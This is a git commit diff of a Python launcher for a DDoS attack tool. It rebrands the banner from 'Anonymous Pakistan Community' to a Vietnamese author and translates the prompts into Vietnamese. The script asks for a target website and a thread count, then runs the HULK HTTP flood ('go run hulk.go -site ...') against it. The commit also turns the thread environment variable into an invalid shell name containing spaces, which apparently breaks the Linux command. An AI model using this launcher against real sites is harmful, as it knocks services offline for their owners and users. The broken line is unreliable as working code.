b5b691f437a8a59e56a6400da026b1a6505d38fd
brobinh123 <104298748+brobinh123@users.noreply.github.com>
2022-07-17 12:35:29 +0700

    Update Python-Script.py

--- Python-Script.py
+++ Python-Script.py
@@ -14,50 +14,50 @@ def say_stuff(stuff_to_say):
     engine.runAndWait()
 print(Fore.GREEN + Back.BLACK)
 if str(platform.system()) == 'Linux':
-    os.system('figlet AnonymousPAK DDoS Attack')
+    os.system('figlet Hồ Xuân Bình - DDoS Attack')
 else:
-    os.system('pyfiglet AnonymousPAK  DDoS Attack')
+    os.system('pyfiglet Ho Xuan Binh - Go To VIET NAM')
 
-print(Back.GREEN + Fore.GREEN +'[+] Anonymous DDoS tool by' + Fore.RED + 'Anonymous Pakistan Community                              ') 
-print(Back.GREEN + Fore.BLACK + '[+] AnonPAK-DDoS Tool BETA VERSION 0.1                                             ')
-print(Back.BLACK +Fore.GREEN + '[+] AnonPAK-DDoS Tool Interactive Menu in Python by Muneeb Khurram                         ')
-print(Fore.YELLOW + '[+] We are Anonymous, We are a Legion, We do not Forgive, We do not Forget                            ')
-print(Fore.GREEN + '[+] Starting AnonPAK DoS Tool with 1024 Baseline Threads as Default change below as Required           ')
-print(Fore.BLUE + 'Author: ' + Fore.GREEN + 'Muneeb Khurram (UBISOFT-1)')
-print(Fore.RED + 'Youtube: ' + Fore.GREEN + 'https://www.youtube.com/channel/UCzYulTuhxSIqSlW2PqTkkEw')
-print(Fore.YELLOW + 'GitHub: ' + Fore.GREEN + 'https://github.com/ubisoft-1')
+print(Back.GREEN + Fore.GREEN +'[+] Anonymous DDoS tool by' + Fore.RED + 'Nhóm HACKER Đến Từ Việt Nam                              ') 
+print(Back.GREEN + Fore.BLACK + '[+] Tool DDoS Wed V1                                             ')
+print(Back.BLACK +Fore.GREEN + '[+] Tool DDoS Attack Chạy Bằng Kali - Python, Tool do Nhà Phát Triển Hồ Xuân Bình Sáng Lập                         ')
+print(Fore.YELLOW + '[+] Chúng tôi vô danh, chúng tôi là một quân đoàn, chúng tôi không tha thứ, chúng tôi không quên                            ')
+print(Fore.GREEN + '[+] Bắt đầu Công cụ AnonPAK DoS với 1024 Chủ đề cơ sở làm Thay đổi mặc định bên dưới khi Bắt buộc           ')
+print(Fore.BLUE + 'Tác giả: ' + Fore.GREEN + 'Hồ Xuân Bình X Developer')
+print(Fore.RED + 'Youtube: ' + Fore.GREEN + 'https://www.youtube.com/channel/UChcwlqpx3Cz1LAG1Rc2Hz6w')
+print(Fore.YELLOW + 'Facebook: ' + Fore.GREEN + 'Lai Hồ Xuân Bình')
 print('Your OS:'+ Fore.RED + str(platform.system())+Fore.GREEN)
 try:
-    threads = input('[+] ENTER THE NUMBER OF' + Fore.BLUE + ' THREADS ' + Fore.GREEN + 'FOR DDoS >>>')
-    site = input(Fore.BLUE + '[+] Enter the Site that You want to' + Fore.RED + ' DDoS ' + Fore.GREEN + '>>>')
-    colab_status = input(Fore.YELLOW + 'Are you DDoS with Google Collab [Y/N]')
-    attack_severity = input('[+] Enter'+ Fore.RED +' 1'+Fore.GREEN+' For a Very Small'+Fore.RED+' Target'+Fore.GREEN+' Like a Device and' + Fore.YELLOW + ' 2 ' + Fore.GREEN +' for a ' + Fore.YELLOW + 'Website '+ Fore.GREEN + ' >>>')
+    threads = input('[+] NHẬP SỐ' + Fore.BLUE + ' THREADS ' + Fore.GREEN + 'FOR DDoS >>>')
+    site = input(Fore.BLUE + '[+] Nhập trang web mà bạn muốn' + Fore.RED + ' DDoS ' + Fore.GREEN + '>>>')
+    colab_status = input(Fore.YELLOW + 'Bạn có DDoS với Google Colab không [Y/N]')
+    attack_severity = input('[+] Enter'+ Fore.RED +' 1'+Fore.GREEN+' Đối với một rất nhỏ'+Fore.RED+' Target'+Fore.GREEN+' Giống như một thiết bị and' + Fore.YELLOW + ' 2 ' + Fore.GREEN +' for a ' + Fore.YELLOW + 'Website '+ Fore.GREEN + ' >>>')
     if 'Y' == colab_status:
-        print('OK, Now Not using Text-to-Speech to make ur Attack look' + Fore.RED+ ' Cool' + Fore.GREEN)
+        print('OK, Bây giờ không sử dụng Text-to-Speech để làm cho cuộc tấn công của bạn trông như thế nào' + Fore.RED+ ' Cool' + Fore.GREEN)
     if 'y' == colab_status:
-        print('OK, Now Not using Text-to-Speech to make ur Attack look' + Fore.RED+ ' Cool' + Fore.GREEN)
+        print('OK, Bây giờ không sử dụng Text-to-Speech để làm cho cuộc tấn công của bạn trông như thế nào' + Fore.RED+ ' Cool' + Fore.GREEN)
     if 'n' == colab_status:
         if str(platform.system()) == 'Linux':
-            print('[+] As You are on Linux, No, Text-to-Speech')
+            print('[+] Khi bạn đang sử dụng Linux, Không, Chuyển văn bản thành giọng nói')
         else:
-            say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))
+            say_stuff("Tấn công trang web mục tiêu của bạn {0} with {1} Threads".format(site, threads))
     if 'N' == colab_status:
         if str(platform.system()) == 'Linux':
             print('[+] As you are on Linux, No, Text-to-Speech')
         else:
-            say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))
+            say_stuff("Tấn công trang web mục tiêu của bạn {0} with {1} Threads".format(site, threads))
 
     print('[+] Executing Command as Follows')
-    print(Fore.GREEN +'HULKMAXPROCS={0} go run hulk.go -site {1}'.format(threads,site))
+    print(Fore.GREEN +'Hồ Xuân Bình x Developer={0} go run hulk.go -site {1}'.format(threads,site))
     if 'Windows' in str(platform.system()):
         os.system('go run hulk.go -site {0}'.format(site))
     else:
-        os.system('HULKMAXPROCS={0} go run hulk.go -site {1}'.format(threads,site))
+        os.system('Hồ Xuân Bình x Developer={0} go run hulk.go -site {1}'.format(threads,site))
     print(Back.BLACK + Fore.GREEN)
     
 except:
-    print('[+] Execution Stopped with Error Code 0, Install GoLang or Your Internet is not working properly')
-    print('[+] Installing Dependancies')
+    print('[+] Quá trình thực thi bị dừng với mã lỗi 0, Cài đặt GoLang hoặc Internet của bạn không hoạt động bình thường')
+    print('[+] Cài đặt phụ thuộc')
     os.system('python3 Install_Dependancies.py')
     os.system('python Install_Dependancies.py')
     os.system('py Install_Dependancies.py')
